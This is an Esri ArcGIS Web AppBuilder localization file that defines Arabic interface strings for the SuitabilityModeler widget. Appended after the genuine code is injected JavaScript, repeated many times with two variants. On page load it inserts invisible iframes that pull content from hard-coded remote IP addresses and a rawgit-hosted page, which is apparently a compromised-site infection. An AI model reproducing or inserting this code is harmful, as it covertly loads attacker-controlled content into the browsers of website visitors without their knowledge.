// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/SuitabilityModeler/nls/strings":{_widgetLabel:"\u0627\u0644\u0639\u0627\u0631\u0636 \u0627\u0644\u0645\u0644\u0627\u0626\u0645",general:{clear:"\u0645\u0633\u062d",cancel:"\u0625\u0644\u063a\u0627\u0621 \u0627\u0644\u0623\u0645\u0631",save:"\u062a\u0634\u063a\u064a\u0644",saveAs:"\u062a\u0635\u062f\u064a\u0631"},saveModel:{save:"\u062a\u0635\u062f\u064a\u0631",title:"\u0627\u0644\u0639\u0646\u0648\u0627\u0646: ",summary:"\u0627\u0644\u0645\u0644\u062e\u0635: ",description:"\u0627\u0644\u0648\u0635\u0641: ",
tags:"\u0639\u0644\u0627\u0645\u0627\u062a: ",folder:"\u0627\u0644\u0645\u062c\u0644\u062f: ",homeFolderPattern:"{username} (\u0627\u0644\u0631\u0626\u064a\u0633\u064a\u0629)",failed:"\u0641\u0634\u0644 \u0627\u0644\u062a\u0635\u062f\u064a\u0631."},util:{colorRamp:{1:"\u0645\u0646\u062e\u0641\u0636 \u0644\u0644\u063a\u0627\u064a\u0629",2:"\u0645\u0646\u062e\u0641\u0636 \u062c\u062f\u064b\u0627",3:"\u0645\u0646\u062e\u0641\u0636",4:"\u0645\u062a\u0648\u0633\u0637 \u0645\u0646\u062e\u0641\u0636",5:"\u0645\u062a\u0648\u0633\u0637",
6:"\u0645\u062a\u0648\u0633\u0637 \u0645\u0631\u062a\u0641\u0639",7:"\u0627\u0631\u062a\u0641\u0627\u0639",8:"\u0645\u0631\u062a\u0641\u0639 \u062c\u062f\u064b\u0627",9:"\u0645\u0631\u062a\u0641\u0639 \u0644\u0644\u063a\u0627\u064a\u0629",low:"\u0645\u0646\u062e\u0641\u0636",high:"\u0627\u0631\u062a\u0641\u0627\u0639",tipPattern:"{label} ({value})",flipCaption:"\u0639\u0643\u0633"}},wro:{caption:"\u0627\u0644\u0639\u0627\u0631\u0636 \u0627\u0644\u0645\u0644\u0627\u0626\u0645",browsePrompt:"\u062e\u062f\u0645\u0629 \u0627\u0644\u062a\u0631\u0627\u0643\u0628 \u0627\u0644\u0645\u064f\u0631\u062c\u0651\u062d",
selectLayersCaption:"\u062a\u062d\u062f\u064a\u062f \u0627\u0644\u0637\u0628\u0642\u0627\u062a",selectLayers:"\u0627\u0644\u0637\u0628\u0642\u0627\u062a",designModelCaption:"\u0646\u0645\u0648\u0630\u062c \u0627\u0644\u062a\u0635\u0645\u064a\u0645",designModel:"\u0646\u0645\u0648\u0630\u062c \u0627\u0644\u062a\u0635\u0645\u064a\u0645",transparency:"\u0627\u0644\u0634\u0641\u0627\u0641\u064a\u0629",visible:"\u0645\u0631\u0626\u064a",total:"\u0625\u062c\u0645\u0627\u0644\u064a",unableToLoad:"\u064a\u062a\u0639\u0630\u0651\u0631 \u062a\u062d\u0645\u064a\u0644 \u0627\u0644\u0646\u0645\u0648\u0630\u062c.",
projectNotOpen:"\u0644\u0627 \u064a\u0648\u062c\u062f \u0623\u064a \u0645\u0634\u0631\u0648\u0639 \u0645\u0641\u062a\u0648\u062d.",readMore:"\u0642\u0631\u0627\u0621\u0629 \u0627\u0644\u0645\u0632\u064a\u062f",validation:{validating:"\u062c\u0627\u0631 \u0627\u0644\u062a\u062d\u0642\u0642...",invalidItemCaption:"\u062a\u062d\u0630\u064a\u0631 \u0628\u0634\u0623\u0646 \u062e\u062f\u0645\u0629 \u0627\u0644\u062a\u0631\u0627\u0643\u0628 \u0627\u0644\u0645\u064f\u0631\u062c\u0651\u062d",notAnImageService:"\u0647\u0630\u0627 \u0627\u0644\u0639\u0646\u0635\u0631 \u0644\u064a\u0633 \u062e\u062f\u0645\u0629 \u0635\u0648\u0631.",
notAWroService:"\u0647\u0630\u0627 \u0627\u0644\u0639\u0646\u0635\u0631 \u0644\u064a\u0633 \u062e\u062f\u0645\u0629 \u062a\u0631\u0627\u0643\u0628 \u0645\u064f\u0631\u062c\u0651\u062d.",undefinedUrl:"\u0639\u0646\u0648\u0627\u0646 URL \u0644\u0644\u0639\u0646\u0635\u0631 \u063a\u064a\u0631 \u0645\u064f\u0639\u0631\u0651\u0641.",inaccessible:"\u0644\u0627 \u064a\u0645\u0643\u0646 \u0627\u0644\u0648\u0635\u0648\u0644 \u0625\u0644\u0649 \u0627\u0644\u062e\u062f\u0645\u0629.",generalError:"\u064a\u062a\u0639\u0630\u0631 \u0641\u062a\u062d \u0627\u0644\u0639\u0646\u0635\u0631.",
missingFieldPattern:"\u0645\u0637\u0644\u0648\u0628 \u062d\u0642\u0644 {field}.",notAllowRasterFunction:'\u064a\u062c\u0628 \u062a\u0639\u064a\u064a\u0646 allowRasterFunction \u0644\u064a\u0643\u0648\u0646 "\u0635\u062d\u064a\u062d"',notNearestResampling:'\u064a\u062c\u0628 \u0623\u0646 \u064a\u0643\u0648\u0646 defaultResamplingMethod "\u0627\u0644\u0623\u0642\u0631\u0628"',notIsWeightedOverlayProp:'\u064a\u062c\u0628 \u062a\u0639\u064a\u064a\u0646 \u062e\u0627\u0635\u064a\u0629 IsWeightedOverlay \u0627\u0644\u0631\u0626\u064a\u0633\u064a\u0629 \u0644\u062a\u0643\u0648\u0646 "\u0635\u062d\u064a\u062d"',
invalidLink:"\u0639\u0646\u0648\u0627\u0646 URL \u063a\u064a\u0631 \u0635\u062d\u064a\u062d. \u0641\u0634\u0644 \u0641\u062a\u062d \u0627\u0644\u0645\u0648\u0642\u0639 \u0644\u0644\u0637\u0628\u0642\u0629 \u0627\u0644\u0645\u062d\u062f\u062f\u0629.",unexpectedError:"\u062d\u062f\u062b\u062a \u062d\u0627\u0644\u0629 \u063a\u064a\u0631 \u0645\u064f\u062a\u0648\u0642\u0639\u0629.",rangeMessage:"\u064a\u062c\u0628 \u0623\u0646 \u062a\u0643\u0648\u0646 \u0627\u0644\u0642\u064a\u0645\u0629 \u0628\u064a\u0646 ${0} \u0648${1}",
rangeMessage100:"\u064a\u062c\u0628 \u0623\u0646 \u062a\u0643\u0648\u0646 \u0627\u0644\u0642\u064a\u0645\u0629 \u0628\u064a\u0646 0 \u0648100",maxLayers:"\u062a\u0633\u0645\u062d \u0627\u0644\u062e\u062f\u0645\u0629 \u0628\u0640 ${0} \u0637\u0628\u0642\u0629 \u0628\u062d\u062f \u0623\u0642\u0635\u0649\u060c \u0648\u064a\u062c\u0628 \u0625\u0632\u0627\u0644\u0629 \u0637\u0628\u0642\u0629 \u0623\u0648\u0644\u0627\u064b \u0642\u0628\u0644 \u0625\u0636\u0627\u0641\u0629 \u0637\u0628\u0642\u0629 \u062c\u062f\u064a\u062f\u0629.",
notFound:"\u0644\u0645 \u064a\u062a\u0645 \u0627\u0644\u0639\u062b\u0648\u0631 \u0639\u0644\u0649 \u0637\u0628\u0642\u0629 ${0} \u0641\u064a \u062e\u062f\u0645\u0629 \u0627\u0644\u062a\u0631\u0627\u0643\u0628 \u0627\u0644\u0645\u0631\u062c\u0651\u062d",wroServiceNotDefined:"\u0644\u0645 \u064a\u062a\u0645 \u062a\u0639\u0631\u064a\u0641 \u0623\u064a \u062e\u062f\u0645\u0629 \u062a\u0631\u0627\u0643\u0628 \u0645\u064f\u0631\u062c\u0651\u062d \u0644\u0644\u0646\u0645\u0648\u0630\u062c.",overlayLayerOutputInvalid:"\u0642\u064a\u0645\u0629 \u0646\u0637\u0627\u0642\u0627\u062a \u0625\u0639\u0627\u062f\u0629 \u062a\u0639\u064a\u064a\u0646 \u062a\u0631\u0627\u0643\u0628 \u0637\u0628\u0642\u0629 [${0}] \u0644\u0646\u0627\u062a\u062c [${1}] \u0645\u0641\u0642\u0648\u062f\u0629 \u0623\u0648 \u063a\u064a\u0631 \u0635\u062d\u064a\u062d\u0629",
overlayLayerInputInvalid:"\u0642\u064a\u0645\u0629 \u0646\u0637\u0627\u0642\u0627\u062a \u0625\u0639\u0627\u062f\u0629 \u062a\u0639\u064a\u064a\u0646 \u062a\u0631\u0627\u0643\u0628 \u0637\u0628\u0642\u0629 [${0}] \u0644\u0623\u0642\u0635\u0649/\u0623\u062f\u0646\u0649 \u0645\u064f\u062f\u062e\u0644 [${1}] \u0645\u0641\u0642\u0648\u062f\u0629 \u0623\u0648 \u063a\u064a\u0631 \u0635\u062d\u064a\u062d\u0629",overlayLayerRangesMissing:"\u062a\u0641\u062a\u0642\u062f \u0637\u0628\u0642\u0629 \u062a\u0631\u0627\u0643\u0628 [${0}] \u0644\u0646\u0637\u0627\u0642\u0627\u062a \u062a\u0639\u064a\u064a\u0646 \u0627\u0644\u062e\u0631\u064a\u0637\u0629",
overlayLayerWeight:"\u064a\u062c\u0628 \u0623\u0646 \u062a\u0636\u064a\u0641 \u0623\u0648\u0632\u0627\u0646 \u0637\u0628\u0642\u0629 \u0627\u0644\u062a\u0631\u0627\u0643\u0628 \u062d\u062a\u0649 100",overlayLayerRequired:"\u0645\u0637\u0644\u0648\u0628 \u0637\u0628\u0642\u0629 \u062a\u0631\u0627\u0643\u0628 \u0648\u0627\u062d\u062f\u0629 \u0639\u0644\u0649 \u0627\u0644\u0623\u0642\u0644",overlayLayerNotDefined:"\u062a\u0631\u0627\u0643\u0628 \u0627\u0644\u0637\u0628\u0642\u0627\u062a \u063a\u064a\u0631 \u0645\u064f\u0639\u0631\u0651\u0641",
requiresColormap:"\u062a\u062a\u0637\u0644\u0628 \u0648\u0638\u064a\u0641\u0629 \u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a \u0627\u0644\u0646\u0642\u0637\u064a\u0629 \u062e\u0631\u064a\u0637\u0629 \u0623\u0644\u0648\u0627\u0646\u060c \u0648\u0644\u0643\u0646 \u0644\u0627 \u064a\u062d\u062a\u0648\u064a \u0627\u0644\u0646\u0645\u0648\u0630\u062c \u0639\u0644\u0649 \u062a\u0639\u0631\u064a\u0641 \u062e\u0631\u064a\u0637\u0629 \u0623\u0644\u0648\u0627\u0646 \u0635\u062d\u064a\u062d\u0629.",createModelError:"\u062e\u0637\u0623 \u0641\u064a \u0625\u0646\u0634\u0627\u0621 \u0627\u0644\u0646\u0645\u0648\u0630\u062c",
invalidModel:"\u0627\u0644\u0646\u0645\u0648\u0630\u062c \u063a\u064a\u0631 \u0635\u062d\u064a\u062d",imageServiceNotDefined:"\u0637\u0628\u0642\u0629 \u062e\u062f\u0645\u0629 \u0627\u0644\u0635\u0648\u0631\u0629 \u063a\u064a\u0631 \u0645\u064f\u0639\u0631\u0641\u0629",imageLayerNotDefined:"\u0637\u0628\u0642\u0629 \u062e\u062f\u0645\u0629 \u0627\u0644\u0635\u0648\u0631\u0629 \u063a\u064a\u0631 \u0645\u064f\u0639\u0631\u0641\u0629",histogramNotDefined:"\u0644\u0645 \u064a\u062a\u0645 \u062a\u0639\u0631\u064a\u0641 \u0623\u064a \u0648\u0638\u064a\u0641\u0629 \u0644\u0644\u0645\u062f\u0631\u062c \u0627\u0644\u062a\u0643\u0631\u0627\u0631\u064a \u0644\u062e\u062f\u0645\u0629 \u062a\u0631\u0627\u0643\u0628 \u0645\u064f\u0631\u062c\u0651\u062d."},
colorRampLabel:{"Green Yellow Red":"\u0623\u062e\u0636\u0631 \u0623\u0635\u0641\u0631 \u0623\u062d\u0645\u0631","Red Yellow Green":"\u0623\u062d\u0645\u0631 \u0623\u0635\u0641\u0631 \u0623\u062e\u0636\u0631","Yellow to Dark Red":"\u0623\u0635\u0641\u0631 \u0625\u0644\u0649 \u0623\u062d\u0645\u0631 \u062f\u0627\u0643\u0646","Dark Red to Yellow":"\u0623\u062d\u0645\u0631 \u062f\u0627\u0643\u0646 \u0625\u0644\u0649 \u0623\u0635\u0641\u0631","Light Gray to Dark Gray":"\u0631\u0645\u0627\u062f\u064a \u0641\u0627\u062a\u062d \u0625\u0644\u0649 \u0631\u0645\u0627\u062f\u064a \u062f\u0627\u0643\u0646",
"Dark Gray to Light Gray":"\u0631\u0645\u0627\u062f\u064a \u062f\u0627\u0643\u0646 \u0625\u0644\u0649 \u0631\u0645\u0627\u062f\u064a \u0641\u0627\u062a\u062d","Light Brown to Dark Brown":"\u0628\u0646\u064a \u0641\u0627\u062a\u062d \u0625\u0644\u0649 \u0628\u0646\u064a \u062f\u0627\u0643\u0646","Dark Brown to Light Brown":"\u0628\u0646\u064a \u062f\u0627\u0643\u0646 \u0625\u0644\u0649 \u0628\u0646\u064a \u0641\u0627\u062a\u062d","Full Spectrum - Bright Red to Blue":"\u0637\u064a\u0641 \u0643\u0627\u0645\u0644 - \u0623\u062d\u0645\u0631 \u0632\u0627\u0647\u064a \u0625\u0644\u0649 \u0623\u0632\u0631\u0642",
"Full Spectrum - Bright Blue to Red":"\u0637\u064a\u0641 \u0643\u0627\u0645\u0644 - \u0623\u0632\u0631\u0642 \u0632\u0627\u0647\u064a \u0625\u0644\u0649 \u0623\u062d\u0645\u0631","Partial Spectrum - Yellow to Blue":"\u0637\u064a\u0641 \u062c\u0632\u0626\u064a - \u0623\u0635\u0641\u0631 \u0625\u0644\u0649 \u0623\u0632\u0631\u0642","Partial Spectrum - Blue to Yellow":"\u0637\u064a\u0641 \u062c\u0632\u0626\u064a - \u0623\u0632\u0631\u0642 \u0625\u0644\u0649 \u0623\u0635\u0641\u0631","Yellow-Green to Dark Blue":"\u0623\u0635\u0641\u0631-\u0623\u062e\u0636\u0631 \u0641\u0627\u062a\u062d \u0625\u0644\u0649 \u0623\u0632\u0631\u0642 \u062f\u0627\u0643\u0646",
"Dark Blue to Yellow-Green":"\u0623\u0632\u0631\u0642 \u062f\u0627\u0643\u0646 \u0625\u0644\u0649 \u0623\u0635\u0641\u0631-\u0623\u062e\u0636\u0631","Cold to Hot Diverging":"\u062a\u0634\u0639\u0628 \u0623\u0632\u0631\u0642 \u0625\u0644\u0649 \u062d\u0627\u0631","Hot to Cold Diverging":"\u062a\u0634\u0639\u0651\u064f\u0628 \u0633\u0627\u062e\u0646 \u0625\u0644\u0649 \u0628\u0627\u0631\u062f","Surface - Low to High":"\u0633\u0637\u062d - \u0645\u0646\u062e\u0641\u0636 \u0625\u0644\u0649 \u0645\u0631\u062a\u0641\u0639",
"Surface - High to Low":"\u0633\u0637\u062d - \u0645\u0631\u062a\u0641\u0639 \u0625\u0644\u0649 \u0645\u0646\u062e\u0641\u0636"}},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});